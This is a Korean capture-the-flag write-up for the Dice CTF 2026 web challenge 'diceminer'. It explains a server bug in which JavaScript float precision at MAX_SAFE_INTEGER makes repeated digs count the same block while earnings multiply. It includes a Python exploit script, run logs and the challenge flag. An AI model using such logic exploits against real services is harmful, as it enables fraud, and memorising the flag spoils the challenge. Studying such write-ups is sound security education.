---
title: "[Web] diceminer"
description: Writeup for "diceminer from Dice CTF 2026.
date: 2026-03-11 09:00:00 +0900
categories: [CTF, Dice CTF 2026]
tags: [Web]
toc: true
comments: false
---

# diceminer (Dice CTF 2026)

---

- **Name:** diceminer
- **Category:** Web
- **Description:** big rock become small paycheck
- **Difficulty:** ★☆☆☆☆ (108 points, solving 314 out of 497 teams)

---

### 개요

**Connection:** `https://diceminer.chals.dicec.tf`

**Flag format:** `dice{...}`

마인크래프트 스타일의 채굴 게임입니다.
블록을 채굴해서 DiceCoin(DC)을 모으고, **1,000,000 DC**를 모으면 flag를 구매할 수 있습니다.

---

### 게임 구조 분석

제공된 `server.js`를 살펴보면, 게임의 핵심 수치들이 보입니다.

```js
const FLAG_COST = 1_000_000;
const STARTING_BALANCE = 0;
const STARTING_ENERGY = 250;
const HAULING_RATE = 0.95;  // 운반비: 채굴 수입의 95%!
```

곡괭이는 4종류이고, 티어가 올라갈수록 한 번에 채굴하는 범위(range)가 커집니다.

```js
const PICKAXES = [
  { name: 'Wooden Pickaxe',  range: 5,   cost: 0,     tier: 0 },
  { name: 'Stone Pickaxe',   range: 15,  cost: 100,   tier: 1 },
  { name: 'Iron Pickaxe',    range: 40,  cost: 500,   tier: 2 },
  { name: 'Gold Pickaxe',    range: 100, cost: 5000,  tier: 3 },
];
```

광석의 보상은 이렇습니다.

```js
const ORES = {
  surface:  { reward: 10,   tier: 0 },
  stone:    { reward: 10,   tier: 0 },
  coal:     { reward: 80,   tier: 0 },
  iron:     { reward: 300,  tier: 1 },
  gold:     { reward: 750,  tier: 2 },
  diamond:  { reward: 1500, tier: 3 },
};
```

문제는 **운반비(hauling fee)가 95%** 라는 것입니다.
최고급 Gold Pickaxe(range 100)로 다이아몬드(1500 DC)를 100블록 캐도:

```
earnings = 100 × 1500 = 150,000 DC
cost     = 150,000 × 0.95 = 142,500 DC
net      = 150,000 - 142,500 = 7,500 DC  (겨우 5% 수익!)
```

에너지가 250밖에 없으니, 정상 플레이로는 **절대** 1,000,000 DC를 모을 수 없습니다.

---

### 취약점: dig 함수 분석

`/api/dig` 엔드포인트의 핵심 로직을 자세히 봅시다.

```js
let mined = {};        // ← 이번 dig에서 캔 블록 (로컬)
let earnings = 0;
let cx = user.x;
let remaining = pickaxe.range;

while (remaining > 0) {
    cx += dx;               // ← 한 칸 이동
    cy += dy;

    const key = cx + ',' + cy;

    if (user.mined[key]) {  // ← 영구 저장소만 검사!
      remaining--;
      continue;             // 이미 캔 블록이면 스킵
    }

    mined[key] = true;      // ← 로컬에만 기록
    earnings += ore.reward;  // ← 매번 누적!
    remaining--;
}
```

그 다음, 운반비(hauling cost)는 이렇게 계산됩니다.

```js
const blocks = Object.keys(mined);  // ← 유니크한 키만!
let haulBase = 0;
for (const key of blocks) {
    const ore = ORES[getBlockType(bx, by)];
    haulBase += ore.reward;          // ← 유니크 블록 기준
}
const cost = Math.floor(haulBase * HAULING_RATE);
const net = earnings - cost;
```

여기서 중요한 차이가 있습니다.

| 항목 | 계산 기준 |
|------|-----------|
| **earnings** (수입) | 루프 반복마다 누적 (range번) |
| **haulBase** (운반비) | `Object.keys(mined)` = 유니크 키 기준 |

만약 루프가 **매번 같은 key를 생성**한다면?
- `mined[key] = true`는 같은 키에 덮어쓰기 → `Object.keys(mined)`는 **1개**
- 하지만 `earnings += ore.reward`는 **range번 누적**

즉, **earnings은 range배로 뻥튀기되고, 운반비는 1블록분만 계산**됩니다!

---

### 같은 key를 반복 생성하는 법

그렇다면 어떻게 해야 같은 key가 반복 생성될까요?
루프에서 `cx += dx`를 할 때, **cx가 변하지 않으면** 됩니다.

여기서 JavaScript의 숫자 표현 한계가 등장합니다.

JavaScript의 모든 숫자는 **IEEE 754 64비트 부동소수점(double)** 입니다.
정수를 정확하게 표현할 수 있는 범위는 `Number.MAX_SAFE_INTEGER = 9007199254740991` (2^53 - 1)까지입니다.

```js
let x = 9007199254740992;  // 2^53 (MAX_SAFE_INTEGER + 1)
console.log(x + 1);        // 9007199254740992  ← 1을 더해도 안 변함!
console.log(x + 1 === x);  // true  ← !!!
```

이 영역에서는 `cx += 1`을 해도 **cx 값이 변하지 않습니다.**
부동소수점 정밀도(52비트 mantissa)가 부족해서 +1이 반올림으로 사라지는 것입니다.

---

### Exploit 전략

게임 시작 시 x좌표를 `9007199254740991` (MAX_SAFE_INTEGER)로 설정합니다.

```js
// /api/start 에서 x좌표 설정
await api('POST', '/start', { x: 9007199254740991 });
```

이 위치에서 **오른쪽(right)으로 dig**하면:

1. 첫 반복: `cx = 9007199254740991 + 1 = 9007199254740992` → key = `"9007199254740992,-5"`
2. 둘째 반복: `cx = 9007199254740992 + 1 = 9007199254740992` → key = `"9007199254740992,-5"` **(같은 키!)**
3. 셋째 반복: 또 같은 키...
4. ...range번 반복 모두 같은 키!

결과적으로:

```
Gold Pickaxe (range 100) + Diamond (1500 DC) 블록 기준:

earnings = 100 × 1500 = 150,000 DC   ← range번 누적
haulBase = 1 × 1500 = 1,500 DC       ← 유니크 1블록
cost     = floor(1,500 × 0.95) = 1,425 DC
net      = 150,000 - 1,425 = 148,575 DC  ← 한 번의 dig로!
```

정상 플레이 대비 **약 20배**의 수익입니다.

---

### Exploit 실행 과정

exploit은 4단계로 진행됩니다.

**Phase 1 — Wooden Pickaxe (range 5)**

아래로 dig해서 shaft(수갱)를 만들고, exploit으로 coal 블록을 채굴합니다.
Coal(80 DC) × range 5 = 324 DC의 순수익이 발생합니다.
100 DC를 모아 Stone Pickaxe를 구매합니다.

**Phase 2 — Stone Pickaxe (range 15)**

shaft를 더 깊게 파고, Iron 광석(300 DC)에 접근합니다.
Iron × range 15 = 4,215 DC 순수익.
500 DC를 모아 Iron Pickaxe를 구매합니다.

**Phase 3 — Iron Pickaxe (range 40)**

더 깊게 파서 Gold 광석(750 DC)에 접근합니다.
Gold × range 40 = 29,288 DC 순수익.
5,000 DC를 모아 Gold Pickaxe를 구매합니다.

**Phase 4 — Gold Pickaxe (range 100)**

y = -50 이하에서 Diamond(1500 DC)를 채굴합니다.
Diamond × range 100 = **148,575 DC** 순수익.
다이아몬드 7~8블록이면 1,000,000 DC 달성!

실행 결과:

```
[Phase 4] Gold Pickaxe - Diamond!
  [EXPLOIT] y=-92 (diamond): +148,575 DC (bal: 553,455, E: 154)
  [EXPLOIT] y=-105 (diamond): +148,575 DC (bal: 734,721, E: 141)
  [EXPLOIT] y=-113 (diamond): +148,575 DC (bal: 970,463, E: 133)
  [EXPLOIT] y=-114 (diamond): +148,575 DC (bal: 1,119,038, E: 132)

  [FINAL] bal: 1,119,038, E: 132

  FLAG 구매 중...
  🏁 FLAG: dice{first_we_mine_then_we_cr4ft}
```

에너지 132를 남기고 1,119,038 DC를 모아 플래그를 구매했습니다.

---

### Exploit 코드 (Python)

핵심 부분만 발췌합니다.

```python
import requests, hashlib, struct

TARGET = "https://diceminer.chals.dicec.tf"
MAX_SAFE_INT = 9007199254740991  # 2^53 - 1
s = requests.Session()

# 1. 계정 생성 & 게임 시작 (x = MAX_SAFE_INTEGER)
s.post(f"{TARGET}/api/register", json={"username": "exploit_user1", "password": "p4ssw0rd_abc"})
s.post(f"{TARGET}/api/start", json={"x": MAX_SAFE_INT})

# 2. 아래로 dig해서 shaft 생성
s.post(f"{TARGET}/api/dig", json={"direction": "down"})

# 3. 원하는 y좌표로 이동 (mined된 블록 위를 걸어감)
s.post(f"{TARGET}/api/move", json={"moves": [{"x": MAX_SAFE_INT, "y": target_y}]})

# 4. 오른쪽으로 dig → exploit 발동!
r = s.post(f"{TARGET}/api/dig", json={"direction": "right"}).json()
# r["net"] = 148,575 DC (다이아몬드 기준)

# 5. 1,000,000 DC 이상 모이면 flag 구매
r = s.post(f"{TARGET}/api/buy", json={"item": "flag"}).json()
print(r["flag"])  # dice{first_we_mine_then_we_cr4ft}
```

---

### FLAG

```
dice{first_we_mine_then_we_cr4ft}
```

---

### 요약

이 문제의 핵심은 두 가지입니다.

**1. dig 함수의 중복 검사 미흡:**
`user.mined`(영구 저장소)만 검사하고, 같은 dig 내 로컬 `mined` 객체의 중복은 검사하지 않습니다. 그 결과 earnings과 haulBase의 계산 기준이 달라집니다.

**2. JavaScript 부동소수점 정밀도 한계:**
`Number.MAX_SAFE_INTEGER`를 초과하는 영역에서 `+1` 연산이 정밀도 손실로 무시됩니다. 이를 이용해 dig 루프의 좌표 변수가 변하지 않도록 만들어, 같은 블록을 반복 채굴할 수 있습니다.

"big rock become small paycheck" — 운반비 95%로 큰 바위가 작은 월급이 되는 것이 정상이지만,
부동소수점 버그를 이용하면 **큰 바위가 큰 월급**이 됩니다.
